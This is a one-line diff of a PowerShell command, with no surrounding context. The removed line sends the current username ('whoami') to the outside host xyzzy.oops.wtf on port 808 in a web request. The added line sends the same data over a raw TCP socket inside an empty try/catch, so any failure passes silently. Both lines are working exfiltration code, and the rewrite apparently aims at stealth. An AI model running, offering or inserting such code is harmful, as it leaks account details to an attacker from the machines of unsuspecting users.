@@ -1,1 +1,1 @@
-Invoke-WebRequest -UseBasicParsing -URI "http://xyzzy.oops.wtf:808/$(whoami)"
+try{($c=New-Object Net.Sockets.TcpClient('xyzzy.oops.wtf',808)).GetStream().Write(([Text.Encoding]::UTF8.GetBytes($(whoami))),0, $(whoami).Length);$c.Close()}catch{}
